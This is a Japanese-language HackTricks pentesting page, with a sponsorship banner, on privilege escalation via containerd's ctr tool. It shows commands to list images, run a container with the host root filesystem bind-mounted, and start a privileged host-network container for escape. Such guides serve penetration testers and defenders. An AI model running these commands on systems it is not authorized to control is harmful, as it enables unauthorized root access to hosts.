# Containerd (ctr) 特権昇格

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) または [**telegram グループ**](https://t.me/peass) に **参加** または **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live) **をフォロー** してください。
* **HackTricks** と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出して **あなたのハッキングテクニックを共有** してください。

</details>

## 基本情報

**containerd** と `ctr` が何かを学ぶには、以下のリンクに移動してください:

{% content-ref url="../../network-services-pentesting/2375-pentesting-docker.md" %}
[2375-pentesting-docker.md](../../network-services-pentesting/2375-pentesting-docker.md)
{% endcontent-ref %}

## PE 1

ホストに `ctr` コマンドが含まれていることがわかった場合:
```bash
which ctr
/usr/bin/ctr
```
以下は、画像をリストアップできます：

```shell
ctr images ls
```
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
そして、**ホストのルートフォルダをマウントしているこれらのイメージの1つを実行します**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

特権付きコンテナを実行し、そこから脱出します。\
次のように特権付きコンテナを実行できます：
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
次のページで言及されているいくつかの技術を使用して、特権付与機能を悪用してそれから脱出することができます：

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}
